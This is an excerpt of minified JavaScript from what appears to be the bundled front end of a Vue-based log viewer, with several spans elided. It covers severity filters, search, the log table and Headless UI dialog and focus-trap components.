																	class: (0, r.normalizeClass)(["inline-link px-2 -mr-2 py-1 -my-1 rounded-md cursor-pointer text-brand-700 dark:text-brand-500 font-normal", [t ? "active" : ""]])
																}, " Deselect all ", 2)]
															})),
															_: 1
														}, 8, ["onClick"])) : ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(xo), {
															key: 1,
															...
															_: 1
														}, 8, ["onClick"]))], 64)) : (0, r.createCommentVNode)("", !0)]), 0 === (0, r.unref)(n).levelsFound.length ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", Gs, "There are no severity filters to display because no entries have been found.")) : ((0, r.openBlock)(!0), (0, r.createElementBlock)(r.Fragment, {
															key: 1
														}, (0, r.renderList)((0, r.unref)(n).levelsFound, (function(e) {
															return (0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(xo), {
																onClick: (0, r.withModifiers)((function(t) {
																...
																default: (0, r.withCtx)((function(t) {
																	...
																	return [(0, r.createElementVNode)("button", {
																		...
																		checked: e.selected
																	}, null, 8, ["checked"]), (0, r.createElementVNode)("span", Zs, [(0, r.createElementVNode)("span", {
																		class: (0, r.normalizeClass)(["log-level", e.level_class])
																	}, (0, r.toDisplayString)(e.level_name), 3), (0, r.createElementVNode)("span", Ys, (0, r.toDisplayString)(Number(e.count).toLocaleString()), 1)])], 2)]
																})),
																_: 2
															}, 1032, ["onClick"])
														})), 256))])]
				...
				var Qs = n(447),
					...
					tc = (0, r.createElementVNode)("label", {
						for: "query",
						class: "sr-only"
					}, "Search", -1),
					nc = {
						class: "relative flex-1 m-1"
					},
					rc = ["onKeydown"],
					oc = {
						class: "clear-search"
					...
					lc = {
						class: "hidden xl:inline ml-1"
					},
					sc = {
						class: "hidden xl:inline ml-1"
					},
					cc = {
						class: "relative h-0 w-full overflow-visible"
					},
					uc = ["innerHTML"];
				const fc = {
						__name: "SearchInput",
						setup: function(e) {
							var t = Ri(),
								...
								l = (0, r.ref)(i.query.query || ""),
								s = function() {
									var e;
									Hi(o, "query", "" === l.value ? null : l.value), null === (e = document.getElementById("query-submit")) || void 0 === e || e.focus()
								},
								c = function() {
									l.value = "", s()
								};
							return (0, r.watch)((function() {
								...
								function(e, o) {
									return (0, r.openBlock)(), (0, r.createElementBlock)("div", Xs, [(0, r.createElementVNode)("div", {
										class: (0, r.normalizeClass)(["search", {
											"has-error": (0, r.unref)(n).error
										}])
									}, [(0, r.createElementVNode)("div", ec, [tc, (0, r.withDirectives)((0, r.createVNode)((0, r.unref)(Qs), {
										class: "h-4 w-4"
									}, null, 512), [
										[r.vShow, !(0, r.unref)(n).hasMoreResults]
									]), (0, r.withDirectives)((0, r.createVNode)(Zi, {
										class: "w-4 h-4"
									}, null, 512), [
										[r.vShow, (0, r.unref)(n).hasMoreResults]
									])]), (0, r.createElementVNode)("div", nc, [(0, r.withDirectives)((0, r.createElementVNode)("input", {
									...
									]), (0, r.withDirectives)((0, r.createElementVNode)("div", oc, [(0, r.createElementVNode)("button", {
										onClick: c
									}, [(0, r.createVNode)((0, r.unref)(ko), {
										class: "h-4 w-4"
									})])], 512), [
										[r.vShow, (0, r.unref)(t).hasQuery]
									])]), (0, r.createElementVNode)("div", ic, [(0, r.unref)(n).hasMoreResults ? ((0, r.openBlock)(), (0, r.createElementBlock)("button", ac, [(0, r.createElementVNode)("span", null, [(0, r.createTextVNode)("Searching"), (0, r.createElementVNode)("span", lc, (0, r.toDisplayString)((0, r.unref)(a) ? (0, r.unref)(a).name : "all files"), 1), (0, r.createTextVNode)("...")])])) : ((0, r.openBlock)(), (0, r.createElementBlock)("button", {
										key: 1,
										onClick: s,
										id: "query-submit"
									}, [(0, r.createElementVNode)("span", null, [(0, r.createTextVNode)("Search"), (0, r.createElementVNode)("span", sc, (0, r.toDisplayString)((0, r.unref)(a) ? 'in "' + (0, r.unref)(a).name + '"' : "all files"), 1)]), (0, r.createVNode)((0, r.unref)(Es), {
										class: "h-4 w-4"
									})]))])], 2), (0, r.createElementVNode)("div", cc, [(0, r.withDirectives)((0, r.createElementVNode)("div", {
										class: "search-progress-bar",
										style: (0, r.normalizeStyle)({
											width: (0, r.unref)(n).percentScanned + "%"
										})
									}, null, 4), [
										[r.vShow, (0, r.unref)(n).hasMoreResults]
									])]), (0, r.withDirectives)((0, r.createElementVNode)("p", {
										class: "mt-1 text-red-600 text-xs",
										innerHTML: (0, r.unref)(n).error
									}, null, 8, uc), [
										[r.vShow, (0, r.unref)(n).error]
									])])
								}
						}
					},
				...
				var pc = n(923),
					...
					gc = {
						class: "text-green-600 dark:text-green-500 hidden md:inline"
					};
				const yc = {
					...
					setup: function(e) {
						var t = e,
							n = (0, r.ref)(!1),
							o = function() {
								$i(t.log.url), n.value = !0, setTimeout((function() {
									return n.value = !1
								}), 1e3)
							};
						return function(t, i) {
							return (0, r.openBlock)(), (0, r.createElementBlock)("button", {
								...
								onKeydown: i[0] || (i[0] = function() {
									return (0, r.unref)(ia) && (0, r.unref)(ia).apply(void 0, arguments)
								}),
								title: "Copy link to this log entry"
							}, [(0, r.createElementVNode)("span", mc, "Log index " + (0, r.toDisplayString)(e.log.index) + ". Click the button to copy link to this log entry.", 1), (0, r.withDirectives)((0, r.createElementVNode)("span", {
								class: "hidden md:inline group-hover:underline"
							}, (0, r.toDisplayString)(Number(e.log.index).toLocaleString()), 513), [
								[r.vShow, !n.value]
							]), (0, r.withDirectives)((0, r.createVNode)((0, r.unref)(pc), {
								class: "md:opacity-75 group-hover:opacity-100"
							}, null, 512), [
								[r.vShow, !n.value]
							]), (0, r.withDirectives)((0, r.createVNode)((0, r.unref)(hc), {
								class: "text-green-600 dark:text-green-500 md:hidden"
							}, null, 512), [
								[r.vShow, n.value]
							]), (0, r.withDirectives)((0, r.createElementVNode)("span", gc, "Copied!", 512), [
								[r.vShow, n.value]
							])], 40, vc)
						}
					}
				...
				var bc = {
					...
					wc = {
						class: "flex flex-col h-full w-full md:mx-3 mb-4"
					},
					Cc = {
						class: "md:px-4 mb-4 flex flex-col-reverse lg:flex-row items-start"
					},
					_c = {
						key: 0,
						class: "flex items-center mr-5 mt-3 md:mt-0"
					},
					Ec = {
						class: "w-full lg:w-auto flex-1 flex justify-end min-h-[38px]"
					},
					xc = {
					...
					Nc = {
						key: 0,
						class: "relative overflow-hidden h-full text-sm"
					},
					Pc = {
					...
					Vc = [(0, r.createElementVNode)("option", {
						value: "desc"
					}, "Newest first", -1), (0, r.createElementVNode)("option", {
						value: "asc"
					}, "Oldest first", -1)],
					Rc = (0, r.createElementVNode)("label", {
						for: "items-per-page",
						class: "sr-only"
					}, "Items per page", -1),
					Lc = [(0, r.createStaticVNode)('<option value="10">10 items per page</option><option value="25">25 items per page</option><option value="50">50 items per page</option><option value="100">100 items per page</option><option value="250">250 items per page</option><option value="500">500 items per page</option>', 6)],
					Ac = {
						class: "inline-block min-w-full max-w-full align-middle"
					},
					jc = {
					...
					Bc = (0, r.createElementVNode)("thead", {
						class: "bg-gray-50"
					}, [(0, r.createElementVNode)("tr", null, [(0, r.createElementVNode)("th", {
						scope: "col",
						class: "w-[120px] hidden lg:table-cell"
					}, [(0, r.createElementVNode)("div", {
						class: "pl-2"
					}, "Level")]), (0, r.createElementVNode)("th", {
						scope: "col",
						class: "w-[180px] hidden lg:table-cell"
					}, "Time"), (0, r.createElementVNode)("th", {
						scope: "col",
						class: "w-[110px] hidden lg:table-cell"
					}, "Env"), (0, r.createElementVNode)("th", {
						scope: "col",
						class: "hidden lg:table-cell"
					}, "Description"), (0, r.createElementVNode)("th", {
						scope: "col",
						class: "hidden lg:table-cell"
					}, [(0, r.createElementVNode)("span", {
						class: "sr-only"
					...
					Dc = {
						class: "flex items-center lg:pl-2"
					},
					Uc = ["aria-expanded"],
					$c = {
						key: 0,
					...
					zc = {
						class: "w-full h-full group-hover:hidden group-focus:hidden"
					},
					qc = {
					...
					Xc = {
						class: "lg:hidden flex justify-between px-2 pt-2 pb-1 text-xs"
					},
					eu = {
						class: "flex-1"
					},
					tu = (0, r.createElementVNode)("span", {
						class: "font-semibold"
					}, "Time:", -1),
					nu = {
						class: "flex-1"
					},
					ru = (0, r.createElementVNode)("span", {
						class: "font-semibold"
					}, "Env:", -1),
					ou = ["innerHTML"],
					iu = (0, r.createElementVNode)("p", {
						class: "mx-2 lg:mx-8 pt-2 border-t font-semibold text-gray-700 dark:text-gray-400"
					}, "Context:", -1),
					au = ["innerHTML"],
					lu = {
						key: 1,
						class: "py-4 px-8 text-gray-500 italic"
					},
					su = {
						key: 1,
						class: "log-group"
					...
					uu = {
						class: "bg-white text-gray-600 dark:bg-gray-800 dark:text-gray-200 p-12"
					},
					fu = (0, r.createElementVNode)("div", {
					...
					mu = {
						key: 1,
						class: "flex h-full items-center justify-center text-gray-600 dark:text-gray-400"
					},
					gu = {
						key: 0
					},
						...
						setup: function(e) {
							var t = Nr(),
								...
								s = (0, r.computed)((function() {
									return n.selectedFile || String(i.query || "").trim().length > 0
								})),
								c = (0, r.computed)((function() {
									return o.logs && (o.logs.length > 0 || !o.hasMoreResults) && (o.selectedFile || i.hasQuery)
								})),
								u = function(e) {
							...
							return (0, r.watch)([function() {
								...
								function(e, t) {
									var p, h;
									return (0, r.openBlock)(), (0, r.createElementBlock)("div", bc, [(0, r.createElementVNode)("div", wc, [(0, r.createElementVNode)("div", Cc, [(0, r.unref)(s) ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", _c, [(0, r.createVNode)(Js)])) : (0, r.createCommentVNode)("", !0), (0, r.createElementVNode)("div", Ec, [(0, r.createVNode)(dc), (0, r.createElementVNode)("div", xc, [(0, r.createElementVNode)("button", {
										onClick: t[0] || (t[0] = function(e) {
											return (0, r.unref)(o).loadLogs()
										}),
										id: "reload-logs-button",
										title: "Reload current results",
										class: "menu-button"
									}, [(0, r.createVNode)((0, r.unref)(gs), {
										class: "w-5 h-5"
									})])]), (0, r.createElementVNode)("div", kc, [(0, r.createVNode)(Qa, {
										class: "ml-2",
										id: "desktop-site-settings"
									})]), (0, r.createElementVNode)("div", Sc, [(0, r.createElementVNode)("button", Oc, [(0, r.createVNode)((0, r.unref)(ys), {
										class: "w-5 h-5 ml-2",
										onClick: (0, r.unref)(n).toggleSidebar
									}, null, 8, ["onClick"])])])])]), (0, r.unref)(c) ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", Nc, [(0, r.createElementVNode)("div", Pc, [Tc, (0, r.withDirectives)((0, r.createElementVNode)("select", {
										id: "log-sort-direction",
										"onUpdate:modelValue": t[1] || (t[1] = function(e) {
											return (0, r.unref)(o).direction = e
										}),
										class: "select mr-4"
									}, Vc, 512), [
										[r.vModelSelect, (0, r.unref)(o).direction]
									]), Rc, (0, r.withDirectives)((0, r.createElementVNode)("select", {
										id: "items-per-page",
										"onUpdate:modelValue": t[2] || (t[2] = function(e) {
											return (0, r.unref)(o).resultsPerPage = e
										}),
										class: "select"
									}, Lc, 512), [
										[r.vModelSelect, (0, r.unref)(o).resultsPerPage]
									])]), (0, r.createElementVNode)("div", {
										class: "log-item-container h-full overflow-y-auto md:px-4",
										onScroll: t[5] || (t[5] = function(e) {
											return (0, r.unref)(o).onScroll(e)
										})
									}, [(0, r.createElementVNode)("div", Ac, [(0, r.createElementVNode)("table", jc, [Bc, (0, r.unref)(o).logs && (0, r.unref)(o).logs.length > 0 ? ((0, r.openBlock)(!0), (0, r.createElementBlock)(r.Fragment, {
										key: 0
									}, (0, r.renderList)((0, r.unref)(o).logs, (function(n, a) {
										return (0, r.openBlock)(), (0, r.createElementBlock)("tbody", {
											key: a,
											class: (0, r.normalizeClass)([0 === a ? "first" : "", "log-group"]),
											id: "tbody-".concat(a),
											"data-index": a
										}, [(0, r.createElementVNode)("tr", {
											onClick: function(e) {
												return (0, r.unref)(o).toggle(a)
											},
											class: (0, r.normalizeClass)(["log-item group", n.level_class, (0, r.unref)(o).isOpen(a) ? "active" : "", (0, r.unref)(o).shouldBeSticky(a) ? "sticky z-2" : ""]),
											style: (0, r.normalizeStyle)({
												top: (0, r.unref)(o).stackTops[a] || 0
											})
										}, [(0, r.createElementVNode)("td", Fc, [(0, r.createElementVNode)("div", Dc, [(0, r.createElementVNode)("button", {
											"aria-expanded": (0, r.unref)(o).isOpen(a),
											onKeydown: t[3] || (t[3] = function() {
												return (0, r.unref)(oa) && (0, r.unref)(oa).apply(void 0, arguments)
											}),
										...
										}, [(0, r.unref)(o).isOpen(a) ? (0, r.createCommentVNode)("", !0) : ((0, r.openBlock)(), (0, r.createElementBlock)("span", $c, "Expand log entry")), (0, r.unref)(o).isOpen(a) ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", Hc, "Collapse log entry")) : (0, r.createCommentVNode)("", !0), (0, r.createElementVNode)("span", zc, ["danger" === n.level_class ? ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(bs), {
											key: 0
										})) : "warning" === n.level_class ? ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(ws), {
											key: 1
										})) : ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(Cs), {
											key: 2
										}))]), (0, r.createElementVNode)("span", qc, [(0, r.createVNode)((0, r.unref)(_s), {
											class: (0, r.normalizeClass)([(0, r.unref)(o).isOpen(a) ? "rotate-90" : "", "transition duration-100"])
										}, null, 8, ["class"])])], 40, Uc), (0, r.createElementVNode)("span", null, (0, r.toDisplayString)(n.level_name), 1)])]), (0, r.createElementVNode)("td", Wc, [(0, r.createElementVNode)("span", {
											class: "hidden lg:inline",
											innerHTML: (0, r.unref)(Di)(n.datetime, (0, r.unref)(i).query)
										}, null, 8, Kc), (0, r.createElementVNode)("span", Gc, (0, r.toDisplayString)(n.time), 1)]), (0, r.createElementVNode)("td", {
											class: "whitespace-nowrap text-gray-500 dark:text-gray-300 dark:opacity-90 hidden lg:table-cell",
											innerHTML: (0, r.unref)(Di)(n.environment, (0, r.unref)(i).query)
										}, null, 8, Zc), (0, r.createElementVNode)("td", {
											class: "max-w-[1px] w-full truncate text-gray-500 dark:text-gray-300 dark:opacity-90",
											innerHTML: (0, r.unref)(Di)(n.text, (0, r.unref)(i).query)
										}, null, 8, Yc), (0, r.createElementVNode)("td", Jc, [(0, r.createVNode)(yc, {
											log: n,
											class: "pr-2 large-screen"
										}, null, 8, ["log"])])], 14, Mc), (0, r.withDirectives)((0, r.createElementVNode)("tr", null, [(0, r.createElementVNode)("td", Qc, [(0, r.createElementVNode)("div", Xc, [(0, r.createElementVNode)("div", eu, [tu, (0, r.createTextVNode)(" " + (0, r.toDisplayString)(n.datetime), 1)]), (0, r.createElementVNode)("div", nu, [ru, (0, r.createTextVNode)(" " + (0, r.toDisplayString)(n.environment), 1)]), (0, r.createElementVNode)("div", null, [(0, r.createVNode)(yc, {
											log: n
										}, null, 8, ["log"])])]), (0, r.createElementVNode)("pre", {
											class: "log-stack",
											innerHTML: (0, r.unref)(Di)(n.full_text, (0, r.unref)(i).query)
										}, null, 8, ou), n.contexts && n.contexts.length > 0 ? ((0, r.openBlock)(), (0, r.createElementBlock)(r.Fragment, {
											key: 0
										}, [iu, ((0, r.openBlock)(!0), (0, r.createElementBlock)(r.Fragment, null, (0, r.renderList)(n.contexts, (function(e) {
											return (0, r.openBlock)(), (0, r.createElementBlock)("pre", {
												class: "log-stack",
												innerHTML: u(e)
											}, null, 8, au)
										})), 256))], 64)) : (0, r.createCommentVNode)("", !0), n.full_text_incomplete ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", lu, [(0, r.createTextVNode)(" The contents of this log have been cut short to the first " + (0, r.toDisplayString)(e.LogViewer.max_log_size_formatted) + ". The full size of this log entry is ", 1), (0, r.createElementVNode)("strong", null, (0, r.toDisplayString)(n.full_text_length_formatted), 1)])) : (0, r.createCommentVNode)("", !0)])], 512), [
											[r.vShow, (0, r.unref)(o).isOpen(a)]
										])], 10, Ic)
									})), 128)) : ((0, r.openBlock)(), (0, r.createElementBlock)("tbody", su, [(0, r.createElementVNode)("tr", null, [(0, r.createElementVNode)("td", cu, [(0, r.createElementVNode)("div", uu, [fu, (0, r.createElementVNode)("div", du, [(null === (p = (0, r.unref)(i).query) || void 0 === p ? void 0 : p.length) > 0 ? ((0, r.openBlock)(), (0, r.createElementBlock)("button", {
										key: 0,
										...
										onClick: d
									}, "Clear search query ")) : (0, r.createCommentVNode)("", !0), (null === (h = (0, r.unref)(i).query) || void 0 === h ? void 0 : h.length) > 0 && (0, r.unref)(n).selectedFile ? ((0, r.openBlock)(), (0, r.createElementBlock)("button", {
										key: 1,
										...
										onClick: (0, r.withModifiers)(f, ["prevent"])
									}, "Search all files ", 8, pu)) : (0, r.createCommentVNode)("", !0), (0, r.unref)(l).levelsFound.length > 0 && 0 === (0, r.unref)(l).levelsSelected.length ? ((0, r.openBlock)(), (0, r.createElementBlock)("button", {
										key: 2,
										class: "px-3 ml-3 py-2 border dark:border-gray-700 text-gray-800 dark:text-gray-200 hover:border-brand-600 dark:hover:border-brand-700 rounded-md",
									...
									}, "Select all severities ")) : (0, r.createCommentVNode)("", !0)])])])])]))])])], 32), (0, r.withDirectives)((0, r.createElementVNode)("div", hu, [(0, r.createElementVNode)("div", vu, [(0, r.createVNode)(Zi, {
										class: "w-14 h-14"
									})])], 512), [
										[r.vShow, (0, r.unref)(o).loading && (!(0, r.unref)(o).isMobile || !(0, r.unref)(n).sidebarOpen)]
									])])) : ((0, r.openBlock)(), (0, r.createElementBlock)("div", mu, [(0, r.unref)(o).hasMoreResults ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", gu, "Searching...")) : ((0, r.openBlock)(), (0, r.createElementBlock)("span", yu, "Select a file or start searching..."))])), (0, r.unref)(c) && (0, r.unref)(a).hasPages ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", bu, [(0, r.createElementVNode)("div", wu, [(0, r.createVNode)(Is, {
										loading: (0, r.unref)(o).loading
									}, null, 8, ["loading"])]), (0, r.createElementVNode)("div", Cu, [(0, r.createVNode)(Is, {
										loading: (0, r.unref)(o).loading,
										short: !0
				...
				function Ru(e, t, n, r, o, i) {
					...
					return Tu(e, ...o), Pu(e, ...t, ...n), a.nextFrame((() => {
						Tu(e, ...n), Pu(e, ...r), a.add(function(e, t) {
							let n = Nu();
						...
						}(e, (n => (Tu(e, ...r, ...t), Pu(e, ...o), l(n)))))
					})), a.add((() => Tu(e, ...t, ...n, ...r, ...o))), a.add((() => l("cancelled"))), a.dispose
				}

				function Lu(e = "") {
					return e.split(" ").filter((e => e.trim().length > 1))
				}
				let Au = Symbol("TransitionContext");
				var ju = (e => (e.Visible = "visible", e.Hidden = "hidden", e))(ju || {});
				let Bu = Symbol("NestingContext");

				function Iu(e) {
					return "children" in e ? Iu(e.children) : e.value.filter((({
						state: e
					}) => "visible" === e)).length > 0
				}
				...
				let Fu = Rr.RenderStrategy,
					Du = (0, r.defineComponent)({
						props: {
							as: {
								type: [Object, String],
								default: "div"
						...
						setup(e, {
							...
							if (null === (0, r.inject)(Au, null) && null !== Zr()) return () => (0, r.h)($u, {
								...e,
							...
							let a = (0, r.ref)(null),
								l = (0, r.ref)("visible"),
								s = (0, r.computed)((() => e.unmount ? Lr.Unmount : Lr.Hidden));
							i({
								el: a,
								$el: a
							});
							...
							return (0, r.onMounted)((() => {
								...
								(0, r.watch)([c], ((e, n, r) => {
									(function(e) {
										let n = p.value && !u.value,
											r = zr(a);
										!r || !(r instanceof HTMLElement) || n || (v.value = !0, c.value && t("beforeEnter"), c.value || t("beforeLeave"), e(c.value ? Ru(r, g, y, b, w, (e => {
											v.value = !1, e === Vu.Finished && t("afterEnter")
										})) : Ru(r, C, _, E, w, (e => {
											v.value = !1, e === Vu.Finished && (Iu(m) || (l.value = "hidden", d(h), t("afterLeave")))
										}))))
									})(r), p.value = !1
								}), {
									immediate: !0
								})
							})), (0, r.provide)(Bu, m), Yr((0, r.computed)((() => Tr(l.value, {
								visible: Gr.Open,
								hidden: Gr.Closed
							})))), () => {
								let {
								...
								return Ar({
									theirProps: {
										...b,
										...u && c && qr.isServer ? {
											class: (0, r.normalizeClass)([b.class, ...g, ...y])
										} : {}
									},
									ourProps: w,
									slot: {},
					...
					$u = (0, r.defineComponent)({
						...
						setup(e, {
							...
							let i = Zr(),
								a = (0, r.computed)((() => null === e.show && null !== i ? Tr(i.value, {
									[Gr.Open]: !0,
									[Gr.Closed]: !1
								}) : e.show));
							(0, r.watchEffect)((() => {
							...
							let l = (0, r.ref)(a.value ? "visible" : "hidden"),
								s = Mu((() => {
									l.value = "hidden"
								})),
								c = (0, r.ref)(!0),
								u = {
									show: a,
									appear: (0, r.computed)((() => e.appear || !c.value))
								};
							return (0, r.onMounted)((() => {
								(0, r.watchEffect)((() => {
									c.value = !1, a.value ? l.value = "visible" : Iu(s) || (l.value = "hidden")
								}))
							})), (0, r.provide)(Bu, s), (0, r.provide)(Au, u), () => {
				...
				var Hu = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(Hu || {});
				...
				let Ku = Object.assign((0, r.defineComponent)({
					name: "FocusTrap",
					props: {
						as: {
							type: [Object, String],
					...
					setup(e, {
						...
						! function({
							...
							ownerDocument: a
						}, (0, r.computed)((() => Boolean(16 & e.features))));
						let l = function({
							ownerDocument: e,
							container: t,
							initialFocus: n
						...
						! function({
							...
							var i;
							qu(null == (i = e.value) ? void 0 : i.defaultView, "focus", (e => {
								if (!o.value) return;
								...
								if (!a) return;
								let l = e.target;
								l && l instanceof HTMLElement ? Gu(i, l) ? (r.value = l, lo(l)) : (e.preventDefault(), e.stopPropagation(), lo(a)) : lo(r.value)
							}), !0)
						}({
							ownerDocument: a,
							container: i,
						...
						function d(t) {
							...
							o instanceof HTMLElement && "true" !== o.dataset.headlessuiFocusGuard && (Gu(r, o) || (u.value ? fo(zr(i), Tr(s.value, {
								[Hu.Forwards]: () => eo.Next,
								[Hu.Backwards]: () => eo.Previous
							}) | eo.WrapAround, {
								relativeTo: t.target
							}) : t.target instanceof HTMLElement && lo(t.target)))
						}
						return () => {
							let o = {
									ref: i,
							...
							return (0, r.h)(r.Fragment, [Boolean(4 & a) && (0, r.h)(el, {
								as: "button",
								type: "button",
				...
				function Gu(e, t) {
					var n;
					for (let r of e)
						if (null != (n = r.value) && n.contains(t)) return !0;
					return !1
				}
				let Zu = "body > *",
					Yu = new Set,
				...
				function ef(e, t = (0, r.ref)(!0)) {
					(0, r.watchEffect)((n => {
						...
						if (o) {
							Yu.add(r);
							for (let e of Ju.keys()) e.contains(r) && (Xu(e), Ju.delete(e));
							o.querySelectorAll(Zu).forEach((e => {
								...
								if (Yu.delete(r), Yu.size > 0) o.querySelectorAll(Zu).forEach((e => {
									if (e instanceof HTMLElement && !Ju.has(e)) {
										for (let t of Yu)
											if (e.contains(t)) return;
										Ju.set(e, {
											"aria-hidden": e.getAttribute("aria-hidden"),
									...
									for (let e of Ju.keys()) Xu(e), Ju.delete(e)
							}))
						}
					}))
				}
				let tf = Symbol("ForcePortalRootContext");
				let nf = (0, r.defineComponent)({
				...
				let rf = (0, r.defineComponent)({
						...
						setup(e, {
							...
							let o = (0, r.ref)(null),
								i = (0, r.computed)((() => Wr(o))),
								a = (0, r.inject)(tf, !1),
								l = (0, r.inject)(of, null),
								s = (0, r.ref)(!0 === a || null == l ? function(e) {
									let t = Wr(e);
									if (!t) {
					...
					of = Symbol("PortalGroupContext"),
					af = (0, r.defineComponent)({
						name: "PortalGroup",
						props: {
							as: {
								type: [Object, String],
					...
					lf = Symbol("StackContext");
				var sf = (e => (e[e.Add = 0] = "Add", e[e.Remove = 1] = "Remove", e))(sf || {});
				...
				let uf = Symbol("DescriptionContext");
				(0, r.defineComponent)({
					name: "Description",
					props: {
						as: {
						...
						id: {
							type: String,
							default: () => `headlessui-description-${Dr()}`
						}
					},
					setup(e, {
						attrs: t,
						...
						return (0, r.onMounted)((() => (0, r.onUnmounted)(o.register(e.id)))), () => {
							let {
								...
								...Object.entries(l).reduce(((e, [t, n]) => Object.assign(e, {
									[t]: (0, r.unref)(n)
								})), {}),
								id: s
							};
				...
				function vf(e, t, n) {
					...
					return (0, r.watch)([e, t], (([e, t], [r], o) => {
						if (!e || !t) return;
						hf.dispatch("PUSH", e, n);
						let i = !1;
						o((() => {
							i || (hf.dispatch("POP", null != r ? r : e, n), i = !0)
						}))
					}), {
						immediate: !0
					}), i
				...
				hf.subscribe((() => {
					let e = hf.getSnapshot(),
						t = new Map;
					for (let [n] of e) t.set(n, n.documentElement.style.overflow);
					for (let n of e.values()) {
						let e = "hidden" === t.get(n.doc),
							r = 0 !== n.count;
						(r && !e || !r && e) && hf.dispatch(n.count > 0 ? "SCROLL_PREVENT" : "SCROLL_ALLOW", n), 0 === n.count && hf.dispatch("TEARDOWN", n)
					}
				}));
				var mf = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(mf || {});
				let gf = Symbol("DialogContext");

				function yf(e) {
					let t = (0, r.inject)(gf, null);
					if (null === t) {
						let t = new Error(`<${e} /> is missing a parent <Dialog /> component.`);
						throw Error.captureStackTrace && Error.captureStackTrace(t, yf), t
					}
					return t
				}
				let bf = "DC8F892D-2EBD-447C-A4C8-A03058436FF4",
					wf = (0, r.defineComponent)({
						name: "Dialog",
						inheritAttrs: !1,
						props: {
							as: {
						...
						setup(e, {
							...
							let s = (0, r.ref)(0),
								c = Zr(),
								u = (0, r.computed)((() => e.open === bf && null !== c ? Tr(c.value, {
									[Gr.Open]: !0,
									[Gr.Closed]: !1
								}) : e.open)),
								f = (0, r.ref)(new Set),
							...
							if (i({
									el: d,
									$el: d
								}), e.open === bf && null === c) throw new Error("You forgot to provide an `open` prop to the `Dialog`.");
							if ("boolean" != typeof u.value) throw new Error(`You provided an \`open\` prop to the \`Dialog\`, but the value is not a boolean. Received: ${u.value===bf?void 0:e.open}`);
							let v = (0, r.computed)((() => l.value && u.value ? 0 : 1)),
								m = (0, r.computed)((() => 0 === v.value)),
								g = (0, r.computed)((() => s.value > 1)),
								y = ((0, r.inject)(gf, null), (0, r.computed)((() => g.value ? "parent" : "leaf")));
							ef(d, (0, r.computed)((() => !!g.value && m.value))), cf({
								type: "Dialog",
							...
							let b = function({
									...
									let o = (0, r.ref)([]);
									return (0, r.provide)(uf, {
										register: function(e) {
											return o.value.push(e), () => {
												let t = o.value.indexOf(e); - 1 !== t && o.value.splice(t, 1)
											}
										},
										slot: e,
										name: t,
							...
							return (0, r.provide)(gf, C), ho((() => _()), ((e, t) => {
								C.close(), (0, r.nextTick)((() => null == t ? void 0 : t.focus()))
							}), (0, r.computed)((() => 0 === v.value && !g.value))), qu(null == (a = h.value) ? void 0 : a.defaultView, "keydown", (e => {
								...
								return (0, r.h)(nf, {
									...
									features: m.value ? Tr(y.value, {
										parent: Ku.features.RestoreFocus,
										leaf: Ku.features.All & ~Ku.features.FocusLock
									}) : Ku.features.None
								}, (() => Ar({
									ourProps: s,
									theirProps: l,
					...
					Cf = ((0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-dialog-overlay-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-dialog-backdrop-${Dr()}`
							}
						},
						inheritAttrs: !1,
						setup(e, {
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-dialog-panel-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
					...
					_f = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-dialog-title-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
				...
				var Ef = (0, r.createElementVNode)("div", {
						class: "fixed inset-0"
					}, null, -1),
					xf = {
					...
					Vf = (0, r.createElementVNode)("span", {
						class: "sr-only"
					}, "Close panel", -1),
					Rf = {
					...
					jf = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Select a host", -1),
					Bf = {
						class: "keyboard-shortcut"
					...
					Mf = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Jump to file selection", -1),
					Ff = {
						class: "keyboard-shortcut"
					},
					Df = {
					...
					Uf = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Jump to logs", -1),
					$f = {
						class: "keyboard-shortcut"
					...
					zf = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Severity selection", -1),
					qf = {
						class: "keyboard-shortcut"
					},
					Wf = {
					...
					Kf = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Settings", -1),
					Gf = {
						class: "keyboard-shortcut"
					...
					Yf = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Search", -1),
					Jf = {
						class: "keyboard-shortcut"
					...
					Xf = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Refresh logs", -1),
					ed = {
						class: "keyboard-shortcut"
					...
					nd = (0, r.createElementVNode)("span", {
						class: "description"
					}, "Keyboard shortcuts help", -1);
				const rd = {
					__name: "KeyboardShortcutsOverlay",
					setup: function(e) {
						var t = Mi();
						return function(e, n) {
							return (0, r.openBlock)(), (0, r.createBlock)((0, r.unref)($u), {
								as: "template",
								show: (0, r.unref)(t).helpSlideOverOpen
							}, {
								default: (0, r.withCtx)((function() {
									return [(0, r.createVNode)((0, r.unref)(wf), {
										as: "div",
										class: "relative z-20",
										...
										default: (0, r.withCtx)((function() {
											return [Ef, (0, r.createElementVNode)("div", xf, [(0, r.createElementVNode)("div", kf, [(0, r.createElementVNode)("div", Sf, [(0, r.createVNode)((0, r.unref)(Du), {
												as: "template",
												...
												default: (0, r.withCtx)((function() {
													return [(0, r.createVNode)((0, r.unref)(Cf), {
														class: "pointer-events-auto w-screen max-w-md"
													}, {
														default: (0, r.withCtx)((function() {
